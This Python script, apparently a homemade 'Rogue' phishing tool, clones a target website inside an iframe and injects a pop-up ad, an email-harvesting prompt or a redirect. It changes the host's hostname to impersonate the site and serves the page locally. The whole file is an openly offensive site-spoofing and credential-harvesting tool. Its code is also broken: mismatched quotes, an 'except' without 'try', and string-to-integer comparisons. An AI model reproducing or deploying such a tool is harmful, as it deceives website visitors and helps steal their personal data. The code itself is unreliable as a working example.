import os
import sys
from time import sleep

print("Rogue         ___ ___________  ___    ___")
print("/-----------| |_| | _________| | |    | |")
print("| |---------|  _  | |________  | |    | |")
print("| |________   | | |_________ | | |____| |")
print("| |________|  | | _________| | | ______ |")
print("| |           | | |__________| | |    | |")
print("| |           | |              | |    | |")
print("| |           | |              |_|    |_|")
print("|_|           |_| By guille-exploit@protonmail.com")
cpurl = input("site to clone: ")
print("     [01] Ads")
print("     [02] email cat")
print("     [03] redirect to another website")
print("     [04] Null")
opt = input("choose a option")
if opt == 1:
   Ad = input("Ad: ")
   Ads = True
elif opt == 2:
   email = True
elif opt == 3:
   site = input("site to redirect")
   red = True
else:
   pass
os.system("hostname > host")
op = open("host")
opr = op.read()
op.close()
host = input("Host of the site: ")
os.system("hostname {}".format(host))
os.remove("host")
os.mkdir("Page")
os.chdir("Page")
ope = open("site.html", "w")
if Ad == True:
   opew = ope.write("<html> \n <head> \n \t <iframe src="{}"> \n </head> \n <body> \n \t <script> window.alert("{}") </script> \n </body> \n </html>".format(cpurl, Ad))
elif email == True:
   opew = ope.write("<html> \n <head> \n \t <iframe src="{}"> \n </head> \n <body> \n \t <script> window.alert('What is your email?' + prompt("email")) </script> \n </body> \n </html>".format(cpurl))
elif red == True:
   opew = ope.write("<html> \n <head> \n \t <iframe src="{}"> \n </head> \n <body> \n \t <script> window.open("{}") </script> \n </body> \n </html>".format(cpurl, site))
else:
   pass
ope.close()
print("starting server...")
print("sever started.")
print("press ctrl + c to quit")
os.system("python3 -m http.server 8080")
except KeyboardInterupt:
   print("Restoring...")
   os.system("hostname {}".format(opr))
   sleep(0.5)
   print("closing...")
   sleep(0.5)
   print("closed")
